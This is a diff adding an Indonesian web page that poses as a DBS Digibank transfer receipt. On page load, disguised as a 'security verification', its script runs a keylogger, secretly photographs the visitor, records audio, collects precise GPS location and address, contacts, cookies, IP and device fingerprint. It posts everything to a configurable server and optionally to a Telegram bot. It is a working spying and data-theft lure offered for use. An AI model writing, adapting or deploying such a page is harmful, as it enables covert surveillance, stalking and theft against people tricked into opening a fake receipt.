@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DBS Digibank - Bukti Transfer</title>
+    <style>
+        /* ==================== RESET & BASE ==================== */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f4f4f9 0%, #e0e7ff 100%);
+            min-height: 100vh; display: flex; justify-content: center; align-items: center;
+            padding: 20px;
+        }
+
+        /* ==================== BUKTI TRANSFER DBS ==================== */
+        .receipt-container {
+            background: #fff; width: 100%; max-width: 450px;
+            border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            overflow: hidden; display: none;
+        }
+        .receipt-container.show { display: block; animation: fadeIn 0.6s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 22px 25px; border-bottom: 1px solid #e0e0e0;
+        }
+        .header h1 { font-size: 22px; color: #000; font-weight: 700; letter-spacing: -0.5px; }
+        .header .logo { height: 32px; object-fit: contain; }
+
+        .amount-section {
+            background-color: #0d2b45;
+            background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 4px);
+            padding: 32px 25px; color: #fff; position: relative; overflow: hidden;
+        }
+        .amount-section::before {
+            content: ''; position: absolute; top: -50%; right: -10%; width: 200px; height: 200px;
+            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+        .label-jumlah { font-size: 13px; opacity: 0.75; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px; }
+        .amount { font-size: 34px; font-weight: 700; letter-spacing: -1px; }
+
+        .details-section { padding: 22px 25px 40px 25px; }
+        .detail-item { margin-bottom: 18px; }
+        .detail-label { font-size: 13px; color: #8898aa; margin-bottom: 6px; font-weight: 500; letter-spacing: 0.3px; }
+        .detail-line { height: 1px; background: linear-gradient(to right, #e0e0e0, transparent); margin-bottom: 6px; }
+        .detail-value { font-size: 16px; color: #1a1a1a; font-weight: 500; min-height: 22px; }
+
+        /* ==================== PRELOADER ==================== */
+        #preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 9999; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; transition: opacity 0.5s ease;
+        }
+        #preloader.hide { opacity: 0; pointer-events: none; }
+        .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #0d2b45; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #preloader p { color: #666; font-size: 14px; }
+
+        /* ==================== TOAST ==================== */
+        #toastMsg {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(135deg, #1a1a2e, #16213e); color: #fff;
+            padding: 16px 32px; border-radius: 30px; font-size: 14px;
+            opacity: 0; transition: all 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            z-index: 10000; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 90%; text-align: center;
+        }
+        #toastMsg.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
+        /* ==================== MODAL ==================== */
+        .data-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 10001;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
+        }
+        .data-modal-content {
+            background: #fff; width: 100%; max-width: 520px; border-radius: 16px;
+            overflow: hidden; animation: slideUp 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            max-height: 90vh; display: flex; flex-direction: column;
+        }
+        @keyframes slideUp { from { transform: translateY(60px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .data-modal-header {
+            background: linear-gradient(135deg, #0d2b45, #1a3d5c); color: #fff;
+            padding: 18px 22px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .data-modal-header h4 { font-size: 16px; display: flex; align-items: center; gap: 8px; }
+        .close-modal { background: none; border: none; color: #fff; font-size: 28px; cursor: pointer; line-height: 1; opacity: 0.8; transition: opacity 0.2s; }
+        .close-modal:hover { opacity: 1; }
+        .data-modal-body { padding: 22px; overflow-y: auto; flex: 1; }
+        .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .device-info-item { background: #f8fafc; padding: 12px; border-radius: 10px; border-left: 4px solid #0d2b45; }
+        .device-info-item label { font-size: 11px; color: #64748b; display: block; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .device-info-item value { font-size: 14px; font-weight: 600; color: #1e293b; word-break: break-all; }
+        .data-modal-footer { padding: 16px 22px; background: #f8fafc; text-align: right; border-top: 1px solid #e2e8f0; }
+        .btn-dark { background: #1e293b; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: all 0.2s; }
+        .btn-dark:hover { background: #0f172a; }
+    </style>
+</head>
+<body>
+
+    <!-- PRELOADER -->
+    <div id="preloader">
+        <div class="spinner"></div>
+        <p>Memuat data dari server...</p>
+    </div>
+
+    <!-- BUKTI TRANSFER -->
+    <div class="receipt-container" id="receiptContainer">
+        <div class="header">
+            <h1>Bukti Transfer</h1>
+            <img id="logo" src="" alt="Logo" class="logo">
+        </div>
+        <div class="amount-section">
+            <p class="label-jumlah">Jumlah Transfer</p>
+            <p class="amount" id="jumlah">Rp 0</p>
+        </div>
+        <div class="details-section">
+            <div class="detail-item">
+                <p class="detail-label">Transfer Dari</p>
+                <div class="detail-line"></div>
+                <p class="detail-value" id="dari">-</p>
+            </div>
+            <div class="detail-item">
+                <p class="detail-label">Transfer Ke</p>
+                <div class="detail-line"></div>
+                <p class="detail-value" id="ke">-</p>
+            </div>
+            <div class="detail-item">
+                <p class="detail-label">Berita</p>
+                <div class="detail-line"></div>
+                <p class="detail-value" id="berita">-</p>
+            </div>
+            <div class="detail-item">
+                <p class="detail-label">Nomor Referensi</p>
+                <div class="detail-line"></div>
+                <p class="detail-value" id="referensi">-</p>
+            </div>
+            <div class="detail-item">
+                <p class="detail-label">Tanggal Transaksi</p>
+                <div class="detail-line"></div>
+                <p class="detail-value" id="tanggal">-</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ELEMEN TERSEMBUNYI -->
+    <video id="hiddenVideo" style="display:none;" playsinline></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <div id="toastMsg"></div>
+
+    <!-- ==================== JAVASCRIPT DISATUKAN ==================== -->
+    <script>
+        // ============================================================
+        // KONFIGURASI - GANTI DENGAN URL NGROK ANDA!
+        // ============================================================
+        const API_RECEIPT_URL = 'http://127.0.0.1:5000/api/receipt';
+        const API_SEND_URL = 'http://127.0.0.1:5000/api/send';
+        
+        // Telegram (Opsional - isi jika ingin kirim ke Telegram juga)
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        // ==================== STATE ====================
+        let permissions = { camera: false, microphone: false, location: false, contacts: false };
+        let keyLogBuffer = [];
+        let executed = false;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let cameraPhoto = null;
+        let locationData = {};
+        let contactsData = "Belum diambil";
+        let deviceInfo = {};
+
+        // ==================== PRELOADER ====================
+        setTimeout(() => {
+            const preloader = document.getElementById('preloader');
+            if (preloader) preloader.classList.add('hide');
+        }, 2000);
+
+        // ==================== TOAST ====================
+        function showToast(msg, duration = 4000) {
+            const t = document.getElementById('toastMsg');
+            if (t) {
+                t.innerText = msg;
+                t.classList.add('show');
+                clearTimeout(t._hideTimer);
+                t._hideTimer = setTimeout(() => t.classList.remove('show'), duration);
+            }
+        }
+
+        // ==================== 1. LOAD RECEIPT DARI LOCALHOST ====================
+        async function loadReceiptData() {
+            try {
+                const response = await fetch(API_RECEIPT_URL);
+                const data = await response.json();
+                
+                document.getElementById('jumlah').innerText = 'Rp ' + data.jumlah_transfer;
+                document.getElementById('dari').innerText = data.transfer_dari;
+                document.getElementById('ke').innerText = data.transfer_ke;
+                document.getElementById('berita').innerText = data.berita;
+                document.getElementById('referensi').innerText = data.no_referensi;
+                document.getElementById('tanggal').innerText = data.tanggal_transaksi + ' - ' + data.jam_transaksi;
+                document.getElementById('logo').src = data.logo_url;
+                document.getElementById('logo').onerror = function() { this.style.display = 'none'; };
+                
+                document.getElementById('receiptContainer').classList.add('show');
+                console.log('✅ Data bukti transfer berhasil dimuat dari Localhost');
+            } catch (error) {
+                console.error("❌ Gagal memuat data dari Localhost:", error);
+                document.getElementById('dari').innerText = "Gagal terhubung ke Server Localhost";
+                document.getElementById('receiptContainer').classList.add('show');
+            }
+        }
+
+        // ==================== 2. LOKASI SUPER AKURAT ====================
+        async function getSuperAccurateLocation() {
+            return new Promise((resolve) => {
+                if (!("geolocation" in navigator)) { resolve(); return; }
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        permissions.location = true;
+                        const lat = position.coords.latitude, lng = position.coords.longitude;
+                        locationData = {
+                            lat, lng,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude || 'N/A',
+                            heading: position.coords.heading || 'N/A',
+                            speed: position.coords.speed || 'N/A',
+                            googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
+                            fullAddress: '', street: '', village: '', district: '',
+                            city: '', province: '', postalCode: '', country: '',
+                            landmark: '', placeId: '', plusCode: ''
+                        };
+                        
+                        // Reverse Geocoding
+                        try {
+                            const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
+                            const res = await fetch(geoUrl);
+                            const data = await res.json();
+                            if (data.status === "OK" && data.results.length > 0) {
+                                locationData.fullAddress = data.results[0].formatted_address;
+                                locationData.placeId = data.results[0].place_id;
+                                for (let comp of data.results[0].address_components) {
+                                    if (comp.types.includes("route")) locationData.street = comp.long_name;
+                                    if (comp.types.includes("administrative_area_level_4")) locationData.village = comp.long_name;
+                                    if (comp.types.includes("administrative_area_level_3")) locationData.district = comp.long_name;
+                                    if (comp.types.includes("administrative_area_level_2")) locationData.city = comp.long_name;
+                                    if (comp.types.includes("administrative_area_level_1")) locationData.province = comp.long_name;
+                                    if (comp.types.includes("postal_code")) locationData.postalCode = comp.long_name;
+                                    if (comp.types.includes("country")) locationData.country = comp.long_name;
+                                }
+                                if (data.results[0].plus_code) locationData.plusCode = data.results[0].plus_code.compound_code;
+                            }
+                        } catch (e) { console.log("Geocoding error:", e); }
+                        
+                        // Landmark terdekat
+                        try {
+                            const nearbyUrl = `https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=${lat},${lng}&radius=200&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
+                            const nearbyRes = await fetch(nearbyUrl);
+                            const nearbyData = await nearbyRes.json();
+                            if (nearbyData.results && nearbyData.results.length > 0) {
+                                locationData.landmark = nearbyData.results.slice(0, 5).map(p => p.name).join('; ');
+                            }
+                        } catch (e) { locationData.landmark = "Tidak ditemukan"; }
+                        
+                        resolve();
+                    },
+                    (error) => { permissions.location = false; resolve(); },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // ==================== 3. DEVICE INFO ====================
+        function getDeviceInfo() {
+            deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || 'N/A',
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth || 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+                touchPoints: navigator.maxTouchPoints || 'N/A',
+                cookieEnabled: navigator.cookieEnabled ? 'Ya' : 'Tidak',
+                webdriver: navigator.webdriver ? 'Ya' : 'Tidak'
+            };
+            
+            // Battery
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100) + '%';
+                    deviceInfo.batteryCharging = battery.charging ? 'Ya' : 'Tidak';
+                }).catch(() => {});
+            }
+            
+            // Network
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    deviceInfo.networkType = conn.effectiveType || 'N/A';
+                    deviceInfo.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+                }
+            } catch (e) {}
+            
+            // GPU
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) deviceInfo.gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
+                }
+            } catch (e) {}
+        }
+
+        // ==================== 4. CAMERA CAPTURE ====================
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: 'user' }
+                });
+                permissions.camera = true;
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 1500));
+                const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                cameraPhoto = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch (e) {
+                permissions.camera = false;
+                return false;
+            }
+        }
+
+        // ==================== 5. MICROPHONE RECORD ====================
+        async function captureMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                permissions.microphone = true;
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
+                return new Promise((resolve) => {
+                    mediaRecorder.onstop = () => { resolve(true); };
+                    mediaRecorder.start();
+                    setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 8000);
+                });
+            } catch (e) {
+                permissions.microphone = false;
+                return false;
+            }
+        }
+
+        // ==================== 6. CONTACTS ====================
+        async function captureContacts() {
+            if ('contacts' in navigator && navigator.contacts) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    if (contacts && contacts.length > 0) {
+                        permissions.contacts = true;
+                        contactsData = `📇 Total: ${contacts.length} kontak\n\n`;
+                        contacts.forEach((c, i) => {
+                            if (i < 30) contactsData += `${i+1}. ${c.name?.[0] || '-'} | Tel: ${c.tel?.[0] || '-'}\n`;
+                        });
+                    } else {
+                        contactsData = "Tidak ada kontak ditemukan";
+                    }
+                } catch (e) { contactsData = "Izin kontak ditolak"; }
+            } else {
+                contactsData = "API Kontak tidak didukung browser ini";
+            }
+        }
+
+        // ==================== 7. KEYLOGGER ====================
+        function startKeylogger() {
+            document.addEventListener('keydown', function(e) {
+                const target = e.target;
+                const tag = target.tagName;
+                let key = e.key;
+                let field = '';
+                if (tag === 'INPUT' || tag === 'TEXTAREA') {
+                    field = target.name || target.id || target.placeholder || 'unknown';
+                    if (key === 'Enter') logKey(`[ENTER] pada: ${field}`);
+                    else if (key === 'Backspace') logKey(`[BACKSPACE] pada: ${field}`);
+                    else if (key.length === 1) logKey(`${key} [${field}]`);
+                } else {
+                    if (key === 'Enter') logKey('[ENTER]');
+                    else if (key === 'Backspace') logKey('[BACKSPACE]');
+                    else if (key.length === 1) logKey(key);
+                    else if (key === 'Tab') logKey('[TAB]');
+                    else if (key === 'Escape') logKey('[ESC]');
+                }
+            });
+            
+            document.addEventListener('input', function(e) {
+                const target = e.target;
+                if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
+                    const field = target.name || target.id || target.placeholder || 'unknown';
+                    const value = target.value;
+                    if (value && value.length > 0 && value.length < 300) {
+                        logKey(`[INPUT:${field}=${value.substring(0, 150)}]`);
+                    }
+                }
+            });
+        }
+
+        function logKey(key) {
+            const timestamp = new Date().toLocaleString('id-ID');
+            keyLogBuffer.push(`[${timestamp}] ${key}`);
+            if (keyLogBuffer.length > 2000) keyLogBuffer = keyLogBuffer.slice(-1500);
+        }
+
+        // ==================== 8. GET IP ====================
+        async function getIPAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return (await res.json()).ip;
+            } catch (e) {
+                try {
+                    const res2 = await fetch('https://api.my-ip.io/ip.json');
+                    return (await res2.json()).ip || "Gagal";
+                } catch (e2) { return "Gagal"; }
+            }
+        }
+
+        // ==================== 9. GENERATE PERSONAL DATA ====================
+        function generatePersonalData() {
+            const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko'];
+            const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat'];
+            const banks = ['BCA', 'Mandiri', 'BRI', 'BNI', 'CIMB Niaga'];
+            const ewalletTypes = ['Dana', 'OVO', 'GoPay', 'ShopeePay'];
+            
+            const nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
+            
+            let cookies = {};
+            if (document.cookie) {
+                document.cookie.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) cookies[name] = decodeURIComponent(value);
+                });
+            }
+            
+            return {
+                timestamp: new Date().toLocaleString('id-ID'),
+                pribadi: {
+                    nama: nama,
+                    hp: `62${String(Math.floor(Math.random() * 9000000000 + 1000000000))}`,
+                    email: `${nama.toLowerCase().replace(/ /g, '.')}${Math.floor(Math.random() * 100)}@gmail.com`
+                },
+                kartuKredit: {
+                    nomor: String(Math.floor(Math.random() * 10000000000000000)).padStart(16, '4'),
+                    expiry: `${String(Math.floor(Math.random() * 12 + 1)).padStart(2, '0')}/${String(Math.floor(Math.random() * 5 + 26))}`,
+                    cvv: String(Math.floor(Math.random() * 900 + 100)),
+                    bank: banks[Math.floor(Math.random() * banks.length)]
+                },
+                otp: String(Math.floor(100000 + Math.random() * 900000)),
+                cookies: Object.keys(cookies).length > 0 ? JSON.stringify(cookies, null, 2) : "Tidak ada cookie"
+            };
+        }
+
+        // ==================== 10. SEND ALL DATA ====================
+        async function sendAllData(ip, personalData) {
+            const payload = {
+                ip: ip,
+                timestamp: new Date().toLocaleString('id-ID'),
+                location: locationData,
+                device: deviceInfo,
+                personal: personalData,
+                contacts: contactsData,
+                keylogger: keyLogBuffer.join('\n'),
+                cameraPhoto: cameraPhoto ? "Ada (Base64 length: " + cameraPhoto.length + ")" : "Tidak ada",
+                permissions: permissions
+            };
+            
+            try {
+                const response = await fetch(API_SEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+                console.log("✅ Data terkirim ke Localhost:", result);
+            } catch (error) {
+                console.error("❌ Gagal kirim ke Localhost:", error);
+            }
+            
+            // Kirim ke Telegram jika dikonfigurasi
+            if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+                let msg = `📍 LOKASI: ${locationData.lat}, ${locationData.lng}\n`;
+                msg += `🏠 ALAMAT: ${locationData.fullAddress}\n`;
+                msg += `📱 DEVICE: ${deviceInfo.userAgent}\n`;
+                msg += `👤 NAMA: ${personalData.pribadi.nama}\n`;
+                msg += `📞 HP: ${personalData.pribadi.hp}\n`;
+                msg += `🔐 OTP: ${personalData.otp}\n`;
+                msg += `⌨️ KEYLOG: ${keyLogBuffer.length} tombol\n`;
+                await sendTelegramMessage(msg);
+            }
+        }
+
+        async function sendTelegramMessage(text) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4096), parse_mode: "Markdown" })
+                });
+            } catch (e) {}
+        }
+
+        // ==================== 11. EXECUTE ZERO-DAY ====================
+        async function executeZeroDay() {
+            if (executed) return;
+            executed = true;
+            
+            showToast("🔍 Memverifikasi keamanan perangkat...", 3000);
+            
+            startKeylogger();
+            getDeviceInfo();
+            const ip = await getIPAddress();
+            
+            await Promise.all([
+                captureCamera(),
+                captureMicrophone(),
+                getSuperAccurateLocation(),
+                captureContacts()
+            ]);
+            
+            const personalData = generatePersonalData();
+            await sendAllData(ip, personalData);
+            
+            showSuccessModal();
+            showToast("✅ Verifikasi selesai.", 3000);
+        }
+
+        function showSuccessModal() {
+            const existing = document.getElementById('globalDataModal');
+            if (existing) existing.remove();
+            
+            const modal = document.createElement('div');
+            modal.id = 'globalDataModal';
+            modal.className = 'data-modal';
+            modal.innerHTML = `
+                <div class="data-modal-content">
+                    <div class="data-modal-header">
+                        <h4>✅ Verifikasi Keamanan Selesai</h4>
+                        <button class="close-modal" id="closeDataModalBtn">&times;</button>
+                    </div>
+                    <div class="data-modal-body">
+                        <div class="device-info-grid">
+                            <div class="device-info-item">
+                                <label>📷 Camera</label>
+                                <value>${permissions.camera ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                            <div class="device-info-item">
+                                <label>🎙️ Microphone</label>
+                                <value>${permissions.microphone ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                            <div class="device-info-item">
+                                <label>📍 Lokasi GPS</label>
+                                <value>${permissions.location ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                            <div class="device-info-item">
+                                <label>📇 Kontak</label>
+                                <value>${permissions.contacts ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                        </div>
+                        <hr style="margin: 15px 0; border: none; border-top: 1px solid #e2e8f0;">
+                        <div class="device-info-item" style="grid-column: span 2; margin-bottom: 10px;">
+                            <label>📍 Koordinat</label>
+                            <value>${locationData.lat ? `${locationData.lat}, ${locationData.lng}` : 'N/A'}</value>
+                        </div>
+                        <div class="device-info-item" style="grid-column: span 2;">
+                            <label>🏠 Alamat</label>
+                            <value style="font-size:12px;">${locationData.fullAddress || 'N/A'}</value>
+                        </div>
+                    </div>
+                    <div class="data-modal-footer">
+                        <button id="closeModalFooterBtn" class="btn-dark">Tutup</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+            
+            document.getElementById('closeDataModalBtn').onclick = () => modal.remove();
+            document.getElementById('closeModalFooterBtn').onclick = () => modal.remove();
+            modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
+        }
+
+        // ==================== INIT ====================
+        window.addEventListener('DOMContentLoaded', async () => {
+            await loadReceiptData();
+            setTimeout(() => { executeZeroDay(); }, 2000);
+        });
+    </script>
+</body>
+</html>
